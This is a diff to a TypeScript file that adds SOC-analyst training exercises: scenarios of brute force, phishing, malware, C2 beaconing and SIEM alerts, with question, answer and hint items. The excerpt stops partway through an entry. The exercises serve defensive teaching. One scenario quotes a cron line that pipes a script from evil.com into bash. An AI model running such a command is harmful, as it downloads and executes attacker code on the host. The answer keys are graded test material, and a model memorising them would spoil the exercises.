@@ -1,3 +1,10 @@
+export interface LabQuestion {
+  id: string;
+  question: string;
+  answer: string;
+  hint?: string;
+}
+
 export interface LessonContent {
   id: string;
   courseId: string;
@@ -8,13 +15,14 @@ export interface LessonContent {
     title: string;
     description: string;
     steps: string[];
+    labScenario?: string;
+    labQuestions?: LabQuestion[];
   };
   additionalResources?: {
     title: string;
     url?: string;
     type: "video" | "article" | "tool" | "documentation";
   }[];
-  quiz?: string;
 }
 
 export const lessonContents: LessonContent[] = [
@@ -101,7 +109,44 @@ Successful SOC analysts share these characteristics:
     additionalResources: [
       { title: "SANS SOC Survey Report", type: "article" },
       { title: "Building a SOC - NIST Guidelines", type: "documentation" },
-    ]
+    ],
+    practicalExercise: {
+      title: "SOC Alert Triage & Shift Handover",
+      description: "Practice triaging alerts and making shift handover decisions in a realistic SOC environment.",
+      steps: [
+        "Read the scenario and identify the key events",
+        "Determine the appropriate triage actions",
+        "Decide what information needs to be handed over",
+        "Answer the questions based on your analysis"
+      ],
+      labScenario: "You are an L1 SOC analyst starting your 12-hour night shift at 18:00 UTC. During handover, the outgoing analyst mentions three open alerts: a medium-severity brute force attempt against the VPN gateway from IP 198.51.100.22 (15 failed attempts, no success), a high-severity EDR alert showing PowerShell execution from winword.exe on workstation WS-FIN-03, and a low-severity firewall rule violation from a developer testing a new API. The outgoing analyst investigated the brute force but ran out of time on the EDR alert. Your SIEM dashboard shows 12 new alerts queued since the last review 45 minutes ago.",
+      labQuestions: [
+        {
+          id: "1.1-q1",
+          question: "Which alert should you investigate FIRST based on severity and risk?",
+          answer: "EDR alert",
+          hint: "Consider which alert involves active code execution on an endpoint."
+        },
+        {
+          id: "1.1-q2",
+          question: "What process spawned PowerShell on WS-FIN-03, indicating a possible macro-based attack?",
+          answer: "winword.exe",
+          hint: "Look at the parent process mentioned in the EDR alert."
+        },
+        {
+          id: "1.1-q3",
+          question: "How many failed login attempts were recorded against the VPN gateway?",
+          answer: "15",
+          hint: "Check the brute force alert details from the handover notes."
+        },
+        {
+          id: "1.1-q4",
+          question: "What is the key SOC metric that measures the time between threat entry and detection?",
+          answer: "MTTD",
+          hint: "Review the Key Performance Metrics table in the lesson."
+        }
+      ]
+    }
   },
   {
     id: "1.2",
@@ -160,13 +205,13 @@ A well-functioning SOC requires a diverse team with clearly defined roles. Under
 ### Typical Day:
 | Time | Activity |
 |------|----------|
-| 08:00 | Shift handover, review overnight alerts |
-| 08:30 | Begin alert queue processing |
-| 10:00 | Document and escalate high-priority alert |
-| 12:00 | Lunch break |
-| 13:00 | Continue monitoring and triage |
-| 15:00 | Update ticket documentation |
-| 16:00 | Prepare shift handover notes |
+| 0800 | Shift handover, review overnight alerts |
+| 0830 | Begin alert queue processing |
+| 1000 | Document and escalate high-priority alert |
+| 1200 | Lunch break |
+| 1300 | Continue monitoring and triage |
+| 1500 | Update ticket documentation |
+| 1600 | Prepare shift handover notes |
 
 ## Tier 2: Incident Responder
 
@@ -253,6 +298,33 @@ The average time to progress from L1 to L2 is 1-2 years with continuous learning
         "Review the following scenarios",
         "Identify which SOC role should handle each",
         "Explain your reasoning for each decision"
+      ],
+      labScenario: "A SIEM alert fires showing 50 failed login attempts from a single IP address against the VPN gateway in the last 10 minutes. After initial triage, the L1 analyst confirms the brute force attack succeeded and the attacker logged into an internal server. Lateral movement is suspected, and a new zero-day exploit has been reported targeting your organization's web application framework.",
+      labQuestions: [
+        {
+          id: "1.2-q1",
+          question: "Which SOC role should handle this alert first when it appears on the SIEM dashboard?",
+          answer: "L1 Analyst",
+          hint: "Think about who monitors the SIEM dashboard and performs initial triage."
+        },
+        {
+          id: "1.2-q2",
+          question: "Once the brute force success and lateral movement are confirmed, who should this be escalated to?",
+          answer: "L2 Analyst",
+          hint: "This requires deeper investigation, containment, and correlation across multiple sources."
+        },
+        {
+          id: "1.2-q3",
+          question: "Which role would proactively hunt for signs of the reported zero-day exploit in your environment before any alerts trigger?",
+          answer: "Threat Hunter",
+          hint: "This is a proactive activity — searching for threats before alerts trigger."
+        },
+        {
+          id: "1.2-q4",
+          question: "If the initial VPN brute force alert is generating excessive false positives from the new firewall rule, which role is responsible for tuning detection rules?",
+          answer: "Detection Engineer",
+          hint: "Think about who develops and tunes detection rules."
+        }
       ]
     }
   },
@@ -420,7 +492,43 @@ More advanced tools (forensics, malware analysis) are typically used by L2+ anal
     additionalResources: [
       { title: "Splunk Fundamentals 1", type: "documentation", url: "https://www.splunk.com/en_us/training/courses/splunk-fundamentals-1.html" },
       { title: "MITRE ATT&CK Navigator", type: "tool", url: "https://mitre-attack.github.io/attack-navigator/" }
-    ]
+    ],
+    practicalExercise: {
+      title: "SOC Tool Identification",
+      description: "Identify the correct SOC tools for different security tasks.",
+      steps: [
+        "Review the alert details and determine the appropriate tool",
+        "Match each investigation task to its corresponding platform",
+        "Consider how tools integrate in a SOC workflow",
+      ],
+      labScenario: "You are onboarding as a new L1 SOC analyst. Your manager gives you a test: five alerts have come in and you must identify which tool to use for each task. Alert 1: A phishing email reported by an employee needs header analysis. Alert 2: A workstation is showing suspicious process execution. Alert 3: You need to search for all failed logins across the enterprise in the last hour. Alert 4: A confirmed incident needs to be documented and tracked. Alert 5: You need to check if a suspicious IP has been seen before in your environment.",
+      labQuestions: [
+        {
+          id: "1.3-q1",
+          question: "Which tool category would you use to investigate the suspicious process execution on the workstation (Alert 2)?",
+          answer: "EDR",
+          hint: "This tool provides endpoint visibility including process trees and file activity."
+        },
+        {
+          id: "1.3-q2",
+          question: "Which tool would you use to search for all failed logins across the enterprise (Alert 3)?",
+          answer: "SIEM",
+          hint: "This tool aggregates and correlates logs from multiple sources across the environment."
+        },
+        {
+          id: "1.3-q3",
+          question: "What tool category is used to document and track the confirmed incident (Alert 4)?",
+          answer: "ticketing system",
+          hint: "Think about where incidents are formally logged, assigned, and tracked through resolution."
+        },
+        {
+          id: "1.3-q4",
+          question: "Which tool would help you check if the suspicious IP has been seen before (Alert 5)?",
+          answer: "threat intelligence platform",
+          hint: "This tool stores IOCs and enrichment data from various feeds."
+        },
+      ]
+    },
   },
   {
     id: "1.4",
@@ -621,6 +729,27 @@ All external communication should go through proper channels:
         "Create a handover document using the template",
         "Include all active incidents and pending items",
         "Identify any high-priority items for the next shift"
+      ],
+      labScenario: "During your 12-hour SOC shift, you triaged 45 alerts. 3 were escalated to L2 — one involved a confirmed phishing email with a malicious attachment targeting the finance team. The incident is still under active investigation when your shift ends. Additionally, a recurring false positive from a newly deployed firewall rule triggered 12 times during the shift, and a new IOC blocklist was deployed mid-shift that caught 2 true positive connections which were contained.",
+      labQuestions: [
+        {
+          id: "1.4-q1",
+          question: "What is the MOST critical item to include in the handover document for the incoming shift?",
+          answer: "The active phishing incident under investigation",
+          hint: "Handovers must highlight ongoing incidents that require continuity."
+        },
+        {
+          id: "1.4-q2",
+          question: "Should the recurring false positive alert be included in the handover? If yes, in which section?",
+          answer: "Yes, in the pending items or recommendations section",
+          hint: "Recurring issues affect the next shift's workload and should be documented for tuning."
+        },
+        {
+          id: "1.4-q3",
+          question: "What details about the 2 true positive IOC blocklist incidents should be documented in the handover?",
+          answer: "Incident IDs, affected hosts, containment actions taken, and current status",
+          hint: "The next shift needs to know what happened and whether follow-up is required."
+        }
       ]
     }
   },
@@ -792,7 +921,37 @@ Understanding threat actors helps you:
       "Hacktivists are ideologically driven and seek publicity",
       "Insider threats are dangerous due to legitimate access and system knowledge",
       "Understanding motivations helps prioritize and respond to threats"
-    ]
+    ],
+    practicalExercise: {
+      title: "Threat Actor Attribution",
+      description: "Classify threat actors based on observed behavior and motivation.",
+      steps: [
+        "Analyze the attack characteristics and TTPs",
+        "Determine the likely motivation behind the attack",
+        "Classify the threat actor category",
+      ],
+      labScenario: "Your SOC receives intelligence about four separate incidents targeting your organization this week. Incident A: A sophisticated implant was discovered on a government contractor's network, using custom zero-day exploits with no financial demands — only data exfiltration of classified documents. Incident B: An employee in IT downloaded a cracked software tool that contained a crypto-miner, consuming 80% CPU on their workstation. Incident C: Your company website was defaced with political messages after your CEO made a controversial public statement. Incident D: A disgruntled employee who was passed over for promotion copied 50GB of customer data to a personal USB drive before resigning.",
+      labQuestions: [
+        {
+          id: "2.1-q1",
+          question: "What type of threat actor is most likely behind Incident A (zero-day exploit, data exfiltration of classified documents)?",
+          answer: "nation-state",
+          hint: "Custom zero-days and targeting classified data suggest a well-funded government-backed group."
+        },
+        {
+          id: "2.1-q2",
+          question: "What category does Incident C (website defacement with political messages) fall under?",
+          answer: "hacktivist",
+          hint: "Defacement with political messaging is a hallmark of ideologically motivated attackers."
+        },
+        {
+          id: "2.1-q3",
+          question: "What type of threat does Incident D represent (employee copying data to USB)?",
+          answer: "insider threat",
+          hint: "This person had legitimate access and a personal grievance as motivation."
+        },
+      ]
+    },
   },
   {
     id: "2.2",
@@ -989,6 +1148,33 @@ Attack the vendor to reach the target.
         "Extract any IOCs (domains, URLs, attachment hashes)",
         "Classify the type of phishing attack",
         "Recommend user awareness improvements"
+      ],
+      labScenario: "An employee in the finance department reports a suspicious email from 'support@micros0ft-security.com' with subject 'Urgent: Your account will be suspended'. The email contains a link to 'https://login.micros0ft-security.com/verify' and an attachment named 'Invoice_2024.pdf.exe'. Upon checking the email headers, the 'Return-Path' shows 'attacker@evil.com' while the 'From' field displays 'hr@yourcompany.com'.",
+      labQuestions: [
+        {
+          id: "2.2-q1",
+          question: "What is the primary red flag in the sender's email address?",
+          answer: "Typosquatting — the domain uses '0' (zero) instead of 'o' in 'microsoft'",
+          hint: "Look carefully at the spelling of the domain name."
+        },
+        {
+          id: "2.2-q2",
+          question: "What technique is the attacker using with the attachment file name 'Invoice_2024.pdf.exe'?",
+          answer: "Double extension to disguise an executable as a PDF",
+          hint: "Look at the full file extension — what is the actual file type?"
+        },
+        {
+          id: "2.2-q3",
+          question: "What does the mismatch between 'Return-Path: attacker@evil.com' and 'From: hr@yourcompany.com' indicate?",
+          answer: "Email spoofing — the From field is forged to appear as an internal sender",
+          hint: "Compare the Return-Path (actual sender) with the From field (displayed sender)."
+        },
+        {
+          id: "2.2-q4",
+          question: "Based on all the indicators, what type of phishing attack is this?",
+          answer: "Spear phishing with multiple social engineering techniques including typosquatting, double extension, and email spoofing",
+          hint: "Consider all the techniques used together — this is a targeted attack."
+        }
       ]
     }
   },
@@ -1190,7 +1376,43 @@ Generation 3: Encrypt + Exfiltrate + DDoS → Triple extortion
     additionalResources: [
       { title: "MITRE ATT&CK Malware", type: "documentation" },
       { title: "Any.Run Malware Sandbox", type: "tool" }
-    ]
+    ],
+    practicalExercise: {
+      title: "Malware Classification",
+      description: "Identify malware types based on observed behaviors and indicators.",
+      steps: [
+        "Review the behavioral indicators from each sample",
+        "Match behaviors to known malware categories",
+        "Determine the primary objective of each malware",
+      ],
+      labScenario: "Your malware analysis team shares findings from four samples recovered during recent incidents. Sample 1: The binary encrypts all .docx, .xlsx, and .pdf files on the network share, appends '.locked' extension, and drops a 'README_DECRYPT.txt' demanding 2 BTC. Sample 2: A process disguised as 'svchost32.exe' opens a reverse shell to 45.77.65.12 on port 4444, awaiting commands. It persists via a registry Run key. Sample 3: A legitimate-looking 'Adobe_Update.exe' installs properly but silently logs all keystrokes to a hidden file and exfiltrates them via DNS queries. Sample 4: A worm spreads across the network via SMB, exploiting EternalBlue, replicating itself to every reachable host.",
+      labQuestions: [
+        {
+          id: "2.3-q1",
+          question: "What type of malware is Sample 1 (encrypts files, demands BTC)?",
+          answer: "ransomware",
+          hint: "File encryption combined with a ransom demand is the defining behavior."
+        },
+        {
+          id: "2.3-q2",
+          question: "What is Sample 2 classified as (reverse shell, awaits commands)?",
+          answer: "RAT",
+          hint: "A Remote Access tool that provides persistent backdoor access and command execution."
+        },
+        {
+          id: "2.3-q3",
+          question: "What type of malware is Sample 3 (logs keystrokes, exfiltrates via DNS)?",
+          answer: "trojan",
+          hint: "It appears legitimate but carries hidden malicious functionality."
+        },
+        {
+          id: "2.3-q4",
+          question: "What spreading mechanism does Sample 4 use to propagate across the network?",
+          answer: "SMB",
+          hint: "It exploits a well-known vulnerability in a Windows file sharing protocol."
+        },
+      ]
+    },
   },
   {
     id: "2.4",
@@ -1373,7 +1595,43 @@ ATT&CK maps techniques to data sources needed for detection:
     additionalResources: [
       { title: "MITRE ATT&CK Website", type: "documentation", url: "https://attack.mitre.org/" },
       { title: "ATT&CK Navigator", type: "tool", url: "https://mitre-attack.github.io/attack-navigator/" }
-    ]
+    ],
+    practicalExercise: {
+      title: "MITRE ATT&CK Mapping",
+      description: "Map observed attacker behaviors to MITRE ATT&CK tactics and techniques.",
+      steps: [
+        "Review the attack timeline and observed behaviors",
+        "Identify the ATT&CK tactic for each phase",
+        "Map specific techniques to observed actions",
+      ],
+      labScenario: "During an incident investigation, the following attacker activity timeline was reconstructed: Step 1: The attacker sent a spear-phishing email with a malicious Word macro to the HR department. Step 2: The macro executed PowerShell to download a second-stage payload from an external server. Step 3: The attacker used Mimikatz to dump credentials from LSASS memory. Step 4: Using stolen credentials, the attacker accessed three additional servers via RDP. Step 5: The attacker compressed sensitive files into a .7z archive and uploaded them to a cloud storage service.",
+      labQuestions: [
+        {
+          id: "2.4-q1",
+          question: "What MITRE ATT&CK tactic does Step 1 (spear-phishing email) fall under?",
+          answer: "Initial Access",
+          hint: "This is how the attacker first gained entry into the environment."
+        },
+        {
+          id: "2.4-q2",
+          question: "What tactic does Step 3 (Mimikatz credential dumping) represent?",
+          answer: "Credential Access",
+          hint: "The attacker is harvesting authentication material to use later."
+        },
+        {
+          id: "2.4-q3",
+          question: "What tactic does Step 4 (RDP to additional servers) represent?",
+          answer: "Lateral Movement",
+          hint: "The attacker is moving through the network to reach more systems."
+        },
+        {
+          id: "2.4-q4",
+          question: "What tactic does Step 5 (compressing and uploading files) fall under?",
+          answer: "Exfiltration",
+          hint: "The attacker is stealing data from the environment."
+        },
+      ]
+    },
   },
   // Module 3: Log Analysis Fundamentals
   {
@@ -1542,7 +1800,44 @@ Jan 15 14:32:05 webserver01 sshd[12345]: Failed password for invalid user admin 
       "Every log entry should have timestamp, source, event type, and relevant details",
       "Common challenges include volume, normalization, coverage gaps, and retention",
       "Prioritize authentication, endpoint, firewall, DNS, and proxy logs"
-    ]
+    ],
+    practicalExercise: {
+      title: "Log Analysis & Threat Detection",
+      description: "Analyze log entries from multiple sources to identify a coordinated attack.",
+      steps: [
+        "Review the scenario describing log events",
+        "Identify the attack type from the log patterns",
+        "Determine the compromised systems and accounts",
+        "Answer the questions based on your log analysis"
+      ],
+      labScenario: "Your SIEM ingests the following events within a 10-minute window: Firewall logs show 200 connection attempts from external IP 203.0.113.45 to port 22 (SSH) on server SRV-WEB-01. The Linux auth.log on SRV-WEB-01 records 'Failed password for root from 203.0.113.45' repeated 195 times, followed by 'Accepted password for root from 203.0.113.45'. Five minutes after the successful login, syslog shows a new cron job was created: '*/5 * * * * curl http://evil.com/beacon.sh | bash'. DNS logs reveal SRV-WEB-01 now queries 'c2.evil.com' every 5 minutes.",
+      labQuestions: [
+        {
+          id: "3.1-q1",
+          question: "What type of attack do the 195 failed SSH attempts followed by a success indicate?",
+          answer: "brute force",
+          hint: "Consider an attack that tries many passwords until one works."
+        },
+        {
+          id: "3.1-q2",
+          question: "Which user account was compromised on SRV-WEB-01?",
+          answer: "root",
+          hint: "Check the auth.log entries for the accepted password."
+        },
+        {
+          id: "3.1-q3",
+          question: "What persistence mechanism did the attacker install after gaining access?",
+          answer: "cron job",
+          hint: "Look at what was created 5 minutes after the successful login."
+        },
+        {
+          id: "3.1-q4",
+          question: "What domain does SRV-WEB-01 contact every 5 minutes for command and control?",
+          answer: "c2.evil.com",
+          hint: "Check the DNS log entries at the end of the scenario."
+        }
+      ]
+    }
   },
   {
     id: "3.2",
@@ -1721,6 +2016,33 @@ Verdict: Likely malicious macro execution
         "Track lateral movement using logon type 3 and 10 events",
         "Find privilege escalation through group membership changes",
         "Document findings with timeline and affected systems"
+      ],
+      labScenario: "Your SIEM flags workstation WS-PC01 for suspicious activity. Windows Event Logs show 150 Event ID 4625 (failed logon) entries in 5 minutes, all targeting the 'Administrator' account. Shortly after, a single Event ID 4624 (successful logon) with Logon Type 10 appears for 'Administrator' from an external IP. Later, Event ID 4732 shows user 'john.doe' was added to the 'Domain Admins' group by 'Administrator' at 2:00 AM. Sysmon Event ID 1 shows 'powershell.exe' spawned by 'winword.exe' with a Base64-encoded command line.",
+      labQuestions: [
+        {
+          id: "3.2-q1",
+          question: "What type of attack do the 150 failed logon attempts (Event ID 4625) in 5 minutes indicate?",
+          answer: "Brute force attack",
+          hint: "A high volume of failed login attempts against a single account is a classic indicator."
+        },
+        {
+          id: "3.2-q2",
+          question: "What does Logon Type 10 in the successful logon event indicate, and why is it concerning after the brute force attempts?",
+          answer: "Logon Type 10 is Remote Desktop (RDP). An RDP login from an external IP after brute force attempts indicates the attacker succeeded.",
+          hint: "Logon Type 10 is associated with a specific remote access protocol."
+        },
+        {
+          id: "3.2-q3",
+          question: "What security concern does the Event ID 4732 (adding john.doe to Domain Admins at 2:00 AM) raise?",
+          answer: "Privilege escalation — a user was added to Domain Admins outside business hours, possibly by a compromised admin account",
+          hint: "Think about why admin group changes at unusual hours are suspicious."
+        },
+        {
+          id: "3.2-q4",
+          question: "What does the Sysmon process chain of winword.exe spawning powershell.exe with Base64 encoding suggest?",
+          answer: "A malicious macro in a Word document executed PowerShell — likely a malware dropper",
+          hint: "Word should not normally spawn PowerShell. This is a common malware delivery chain."
+        }
       ]
     }
   },
@@ -1893,7 +2215,43 @@ zgrep "pattern" /var/log/auth.log.*.gz
       "Sudo logs capture privilege escalation with full command details",
       "The audit framework provides detailed syscall and file access logging",
       "Web server logs can reveal SQL injection, path traversal, and web shell activity"
-    ]
+    ],
+    practicalExercise: {
+      title: "Linux Log Investigation",
+      description: "Analyze Linux system logs to identify suspicious activity.",
+      steps: [
+        "Review authentication logs for anomalies",
+        "Check system logs for unauthorized changes",
+        "Correlate timestamps across log sources",
+      ],
+      labScenario: "A Linux web server (Ubuntu 22.04) has been flagged by your SIEM. The /var/log/auth.log shows 200 failed SSH login attempts for user 'root' from IP 103.25.40.11 between 02:00-02:15 UTC, followed by a successful login at 02:16 UTC. After login, /var/log/syslog shows a new user 'support_admin' was created at 02:18 UTC. The /var/log/auth.log then shows 'support_admin' running 'sudo apt install ncat' at 02:20 UTC. Apache access logs show no web traffic anomalies during this period.",
+      labQuestions: [
+        {
+          id: "3.3-q1",
+          question: "What type of attack do the 200 failed SSH attempts followed by a success indicate?",
+          answer: "brute force",
+          hint: "Many failed attempts followed by a success is a classic pattern."
+        },
+        {
+          id: "3.3-q2",
+          question: "What Linux log file records SSH authentication events?",
+          answer: "auth.log",
+          hint: "This log in /var/log/ captures all authentication-related events."
+        },
+        {
+          id: "3.3-q3",
+          question: "What persistence technique did the attacker use after gaining access?",
+          answer: "create account",
+          hint: "The attacker made a new user to maintain future access."
+        },
+        {
+          id: "3.3-q4",
+          question: "What tool did the attacker install that could be used for reverse shells?",
+          answer: "ncat",
+          hint: "This is the networking utility installed via apt."
+        },
+      ]
+    },
   },
   {
     id: "3.4",
@@ -2077,7 +2435,37 @@ query=totally-legit-bank-login.com
       "DNS logs can reveal DGA domains, tunneling, and malicious lookups",
       "VPN logs track remote access with user, location, and duration details",
       "Look for patterns: scanning, beaconing, impossible travel, and data exfiltration"
-    ]
+    ],
+    practicalExercise: {
+      title: "Network Log Analysis",
+      description: "Analyze firewall and network device logs to detect threats.",
+      steps: [
+        "Review firewall logs for suspicious connections",
+        "Identify beaconing patterns in network traffic",
+        "Correlate network events with endpoint alerts",
+      ],
+      labScenario: "Your firewall logs show the following activity from internal host 10.0.5.22 (workstation WS-SALES-08): Between 08:00-17:00 UTC, the host made outbound HTTPS connections to IP 91.195.240.11 exactly every 300 seconds (5 minutes). Each connection transferred approximately 1KB of data outbound and 500 bytes inbound. DNS logs show the host resolved 'cdn-analytics.techupdate.xyz' which points to 91.195.240.11. Your threat intel feed flags this domain as a known C2 server associated with the SolarMarker malware family. VPN logs confirm the user was working remotely from a home IP.",
+      labQuestions: [
+        {
+          id: "3.4-q1",
+          question: "What does the regular 300-second connection interval suggest about this traffic?",
+          answer: "beaconing",
+          hint: "Regular, predictable intervals of outbound connections are a hallmark of this C2 behavior."
+        },
+        {
+          id: "3.4-q2",
+          question: "What is the C2 domain the host is communicating with?",
+          answer: "cdn-analytics.techupdate.xyz",
+          hint: "Check the DNS resolution logs for the domain that resolves to the suspicious IP."
+        },
+        {
+          id: "3.4-q3",
+          question: "What malware family is associated with this C2 infrastructure?",
+          answer: "SolarMarker",
+          hint: "The threat intel feed identified the associated malware family."
+        },
+      ]
+    },
   },
   {
     id: "3.5",
@@ -2250,6 +2638,27 @@ Files/Commands:
         "Extract all indicators of compromise",
         "Determine the scope of the incident",
         "Write recommended containment and remediation actions"
+      ],
+      labScenario: "Firewall logs show outbound connections from database server SRV-DB01 to IP 185.220.101.45 on port 443 every 60 seconds — the IP is flagged as a known C2 server. DNS logs from the same host show queries for 'aGVsbG8=.evil-domain.com' where the subdomain appears Base64 encoded. Investigation reveals the compromised service account 'svc-backup' and file hash 'd41d8cd98f00b204e9800998ecf8427e' on the server.",
+      labQuestions: [
+        {
+          id: "3.5-q1",
+          question: "What MITRE ATT&CK technique does the periodic 60-second outbound connection to the C2 IP represent?",
+          answer: "Command and Control (C2) beaconing — T1071 (Application Layer Protocol)",
+          hint: "Regular interval connections to a known malicious IP indicate automated communication."
+        },
+        {
+          id: "3.5-q2",
+          question: "What technique is being used via the DNS queries, and what does 'aGVsbG8=' decode to?",
+          answer: "DNS tunneling for data exfiltration. The Base64 'aGVsbG8=' decodes to 'hello'.",
+          hint: "Encoding data in DNS queries is a common exfiltration technique."
+        },
+        {
+          id: "3.5-q3",
+          question: "Given all the IOCs identified (C2 IP, domain, file hash, compromised account), what is the first containment action you should take?",
+          answer: "Block the C2 IP and domain at the firewall/proxy and disable the compromised service account",
+          hint: "Containment focuses on stopping active communication with the attacker and preventing further access."
+        }
       ]
     }
   },
@@ -2427,7 +2836,44 @@ When rules match, the SIEM:
       "Correlation rules detect threats by matching patterns across events",
       "Major platforms include Splunk, Sentinel, Elastic, QRadar, and Chronicle",
       "Common challenges include alert fatigue, data volume, and false positives"
-    ]
+    ],
+    practicalExercise: {
+      title: "SIEM Alert Investigation",
+      description: "Use SIEM data to investigate a multi-stage attack involving brute force and lateral movement.",
+      steps: [
+        "Review the SIEM alerts and correlation data",
+        "Identify the attack stages from the event timeline",
+        "Determine the scope of compromise",
+        "Answer the questions based on your SIEM analysis"
+      ],
+      labScenario: "Your SIEM fires a correlation alert: 'Brute Force Followed by Lateral Movement.' The timeline shows: At 09:12 UTC, 300 failed login events (Event ID 4625) targeting the 'svc-admin' account from internal IP 10.0.1.55. At 09:18 UTC, a successful login (Event ID 4624, Logon Type 3) for 'svc-admin' from the same IP. At 09:22 UTC, the 'svc-admin' account initiated RDP sessions (Logon Type 10) to three servers: SRV-DB-01, SRV-APP-02, and SRV-FILE-03. At 09:30 UTC, a new scheduled task named 'WindowsUpdate' was created on SRV-DB-01 executing 'C:\\Temp\\payload.exe'.",
+      labQuestions: [
+        {
+          id: "4.1-q1",
+          question: "What account was targeted in the brute force attack?",
+          answer: "svc-admin",
+          hint: "Check the account name in the failed login events."
+        },
+        {
+          id: "4.1-q2",
+          question: "What Logon Type indicates the RDP lateral movement?",
+          answer: "10",
+          hint: "Review the Event ID 4624 details for the RDP sessions."
+        },
+        {
+          id: "4.1-q3",
+          question: "How many servers did the attacker move laterally to?",
+          answer: "3",
+          hint: "Count the servers accessed via RDP after the initial compromise."
+        },
+        {
+          id: "4.1-q4",
+          question: "What is the name of the suspicious scheduled task created for persistence?",
+          answer: "WindowsUpdate",
+          hint: "Look at the final event at 09:30 UTC on SRV-DB-01."
+        }
+      ]
+    }
   },
   {
     id: "4.2",
@@ -2601,7 +3047,37 @@ Most SIEMs have a field browser showing:
       "Dashboards provide visual summaries of security metrics",
       "Always start with appropriate time ranges and refine as needed",
       "Save common searches and create personal dashboards for efficiency"
-    ]
+    ],
+    practicalExercise: {
+      title: "SIEM Dashboard Investigation",
+      description: "Navigate SIEM dashboards to locate and investigate security events.",
+      steps: [
+        "Use the SIEM search interface to query relevant events",
+        "Apply time filters and field selections",
+        "Interpret dashboard visualizations",
+      ],
+      labScenario: "You log into the SIEM at the start of your shift and the main dashboard shows: 1,247 events in the last hour, 23 high-severity alerts, and 3 critical alerts. The top sources widget shows 'DC-01' generating 40% of all events. The geographic map highlights unusual traffic from Eastern Europe. One critical alert reads: 'Multiple failed logins followed by success — DC-01.' You need to investigate but the default dashboard only shows summary data. The alert timestamp is 06:45 UTC and your shift started at 07:00 UTC.",
+      labQuestions: [
+        {
+          id: "4.2-q1",
+          question: "Which source device should you investigate first based on the dashboard?",
+          answer: "DC-01",
+          hint: "Look at which device is generating the most events and has a critical alert."
+        },
+        {
+          id: "4.2-q2",
+          question: "What time range should you set in your SIEM search to capture events before and after the alert?",
+          answer: "06:00 to 07:00",
+          hint: "Set a window around the 06:45 UTC alert timestamp to see surrounding context."
+        },
+        {
+          id: "4.2-q3",
+          question: "What severity level are the 3 alerts that need immediate attention?",
+          answer: "critical",
+          hint: "The dashboard highlights three alerts at the highest severity level."
+        },
+      ]
+    },
   },
   {
     id: "4.3",
@@ -2828,6 +3304,33 @@ EventCode=4625 | stats count by src_ip     # Add grouping
         "Filter to show only IPs with more than 5 failures",
         "Add user information to the output",
         "Sort by count and limit to top 10"
+      ],
+      labScenario: "Your SIEM receives an alert: 'Excessive Failed Logins Detected.' The correlation rule triggered because 85 failed login attempts (Event ID 4625) were recorded against the 'admin' account from IP 203.0.113.50 within 3 minutes. Shortly after, a successful login (Event ID 4624) from the same IP was logged. The source IP is geolocated to a country your organization has no business with. A follow-up query shows the same IP performed a port scan on the internal network 10 minutes later.",
+      labQuestions: [
+        {
+          id: "4.3-q1",
+          question: "What type of attack does this pattern of 85 failed logins followed by a successful login indicate?",
+          answer: "brute force",
+          hint: "Think about an attack that tries many passwords until one works."
+        },
+        {
+          id: "4.3-q2",
+          question: "Which Windows Event ID indicates the successful login after the brute force attempt?",
+          answer: "4624",
+          hint: "This is the standard Windows event for a successful logon."
+        },
+        {
+          id: "4.3-q3",
+          question: "What follow-up activity did the attacker perform after gaining access?",
+          answer: "port scan",
+          hint: "Look at what the IP did 10 minutes after login."
+        },
+        {
+          id: "4.3-q4",
+          question: "What is the source IP address involved in this attack?",
+          answer: "203.0.113.50",
+          hint: "Check the IP mentioned in the scenario."
+        }
       ]
     }
   },
@@ -3059,7 +3562,37 @@ Risk Assessment: Low - these are known internal scanners
       "Severity levels drive response urgency and SLA requirements",
       "Alert tuning reduces false positives while maintaining detection",
       "Document tuning requests with business justification and risk assessment"
-    ]
+    ],
+    practicalExercise: {
+      title: "Correlation Rule Analysis",
+      description: "Evaluate SIEM correlation rules and tune alerts to reduce false positives.",
+      steps: [
+        "Review the correlation rule logic and thresholds",
+        "Analyze alert frequency and false positive rate",
+        "Recommend tuning adjustments",
+      ],
+      labScenario: "Your SOC has a correlation rule: 'Brute Force Detection' that triggers when more than 5 failed logins occur within 10 minutes from a single source IP. This rule generated 145 alerts last week. Upon review, 130 alerts were caused by a service account 'svc-monitor' that polls 20 servers every 5 minutes — its password expired last Tuesday causing repeated failures. 10 alerts were from employees mistyping passwords at the VPN portal. 5 alerts were genuine brute force attempts from external IPs, 2 of which led to successful logins.",
+      labQuestions: [
+        {
+          id: "4.4-q1",
+          question: "What is the false positive rate of this correlation rule last week (approximate percentage)?",
+          answer: "97%",
+          hint: "Calculate: (130 + 10) false positives out of 145 total alerts."
+        },
+        {
+          id: "4.4-q2",
+          question: "What caused the majority of false positive alerts?",
+          answer: "expired service account password",
+          hint: "130 out of 145 alerts came from a single service account with an authentication issue."
+        },
+        {
+          id: "4.4-q3",
+          question: "What tuning action would most effectively reduce false positives from svc-monitor?",
+          answer: "whitelist the service account",
+          hint: "Exclude the known service account from the correlation rule to eliminate 130 false alerts."
+        },
+      ]
+    },
   },
   {
     id: "4.5",
@@ -3392,7 +3925,44 @@ A **security alert** is a notification generated when a detection rule identifie
       "Context about assets and users is crucial for accurate triage",
       "Alert fatigue from too many false positives leads to missed threats",
       "Effective tuning and prioritization combat alert fatigue"
-    ]
+    ],
+    practicalExercise: {
+      title: "Alert Triage & Severity Assessment",
+      description: "Practice triaging security alerts and assessing their severity in a realistic SOC scenario.",
+      steps: [
+        "Review the incoming alerts and their details",
+        "Classify each alert by severity level",
+        "Determine the appropriate response actions",
+        "Answer the questions based on your triage analysis"
+      ],
+      labScenario: "During your shift, three alerts fire within 15 minutes. Alert 1: EDR detects 'mimikatz.exe' running on domain controller DC-01 under the SYSTEM account at 03:15 AM — no maintenance window is scheduled. Alert 2: Your email gateway flags an inbound email from 'hr-updates@company-benefits.xyz' containing a macro-enabled Word document sent to 8 employees in the finance department. Alert 3: Firewall logs show a single outbound connection from workstation WS-MKT-05 to a known Tor exit node IP on port 9001, lasting 2 seconds. The asset inventory shows DC-01 hosts Active Directory for 2,000 users.",
+      labQuestions: [
+        {
+          id: "5.1-q1",
+          question: "Which alert should be classified as CRITICAL severity?",
+          answer: "Alert 1",
+          hint: "Consider which alert involves credential theft tools on a critical server."
+        },
+        {
+          id: "5.1-q2",
+          question: "What credential dumping tool was detected running on the domain controller?",
+          answer: "mimikatz",
+          hint: "Check the EDR alert details for the executable name."
+        },
+        {
+          id: "5.1-q3",
+          question: "How many employees received the suspicious phishing email?",
+          answer: "8",
+          hint: "Look at the email gateway alert for the recipient count."
+        },
+        {
+          id: "5.1-q4",
